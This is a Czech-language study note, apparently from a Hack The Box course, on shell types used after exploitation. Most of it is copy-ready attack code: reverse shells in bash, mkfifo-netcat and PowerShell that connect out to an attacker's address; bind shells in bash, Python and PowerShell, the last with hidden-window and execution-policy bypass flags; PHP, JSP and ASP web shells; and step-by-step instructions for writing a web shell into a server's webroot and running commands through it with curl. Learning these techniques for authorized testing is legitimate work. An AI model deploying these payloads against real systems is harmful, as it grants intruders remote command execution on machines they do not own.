---
{"dg-publish":true,"permalink":"/hacking/types-of-shells/","dg-note-properties":{"Created":null,"Module":"Post-Exploitation"}}
---

- k stabilnímu připojení na vzdálený target a exekuci commandů po využítí např. RCE
## Reverse shell

- Z targetu se připojíme na náš počítač

### Netcat listener

```bash
nc -lvnp <číslo portu>
```

- `-l` - listening mode, čeká na připojení
- `-v` - řekne nám, až přijde připojení
- `-n` - vypne DNS resolution, větší rychlost
- `-p` - číslo portu

### Reverse shell command

- [Payload All The Things](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/) - stránka na reverse shell commandy

#### Bash (Linux)

```bash
bash -c 'bash -i >& /dev/tcp/<IP adresa>/<Port> 0>&1'
```

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP adresa> <port> >/tmp/f
```

#### Powershell (Windows)

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<IP adresa>',<Port>);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

- Reverse shell je velice náchylný na ztrátu připojení

## Bind shell

- cíl otevře port a čeká, my se připojujeme k němu

### Bind shell command

- stránka [Payload All The Things](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-bind-cheatsheet/)
- na targetu se spustí listening connection s IP 0.0.0.0, aby target poslouchal na všech rozhraní

#### Bash (Linux)

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```

#### Python

```python
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```

#### Powershell

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
```

- na target se připojíme pomocí netcatu

```bash
nc <IP adresa> <Port>
```

### Upgrading TTY

- po připojení můžeme pouze psát příkazy nebo dát backspace, ale nemůžeme se pohybovat kurzorem a nemůžeme používat command history

#### python/stty metoda

```bash
www-data@remotehost$ python3 -c 'import pty; pty.spawn("/bin/bash")'
```

- ctrl + z

```bash
www-data@remotehost$ ^Z
GRAV1TYY@htb[/htb]$ stty raw -echo
GRAV1TYY@htb[/htb]$ fg
```

## **Web Shell**

- web skript, který příjímá naše commandy přes HTTP requesty, executne je a printne výstup na webovku

#### PHP

```php
<?php system($_REQUEST["cmd"]); ?>
```

#### JSP

```php
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

#### ASP

```php
<% eval request("cmd") %>
```

### Uploudování Web Shellu

1. najít webroot

|Web Server|Default Webroot|
|---|---|
|`Apache`|/var/www/html/|
|`Nginx`|/usr/local/nginx/html/|
|`IIS`|c:\inetpub\wwwroot\|
|`XAMPP`|C:\xampp\htdocs\|

2. pouzijeme echo na writenutí do filu

```bash
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```

3. následně ho použijeme např. pomocí cURL

```bash
curl http://SERVER_IP:PORT/shell.php?cmd=<Command>
```
